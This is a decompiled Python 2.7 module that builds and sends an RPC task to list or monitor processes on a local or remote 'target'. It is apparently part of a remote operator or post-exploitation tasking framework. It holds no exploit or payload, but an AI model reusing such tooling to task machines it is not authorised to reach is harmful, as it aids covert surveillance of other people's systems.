# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Processes_Tasking.py
PROCESSES_TYPE_LIST = 0
PROCESSES_TYPE_MONITOR = 1

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.process.cmd.processes', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.process.cmd.processes.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.process.cmd.processes.Params()
    if lpParams['type'] == PROCESSES_TYPE_LIST:
        tgtParams.monitor = False
    elif lpParams['type'] == PROCESSES_TYPE_MONITOR:
        tgtParams.monitor = True
    else:
        mcl.tasking.OutputError('Invalid processes action type (%u)' % lpParams['type'])
        return False
    tgtParams.minimal = lpParams['minimal']
    tgtParams.delay = lpParams['delay']
    if lpParams['serverName'] != None:
        tgtParams.target = lpParams['serverName']
    i = 0
    while i < mca.process.cmd.processes.NUM_IGNORE_NAMES:
        if lpParams['name%u' % (i + 1)] != None:
            tgtParams.ignoreList[i] = lpParams['name%u' % (i + 1)]
        i = i + 1

    rpc = mca.process.cmd.processes.tasking.RPC_INFO_QUERY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    taskXml = mcl.tasking.Tasking()
    if len(tgtParams.target) > 0:
        taskXml.SetTargetRemote(tgtParams.target)
    else:
        taskXml.SetTargetLocal()
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.process.cmd.processes.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)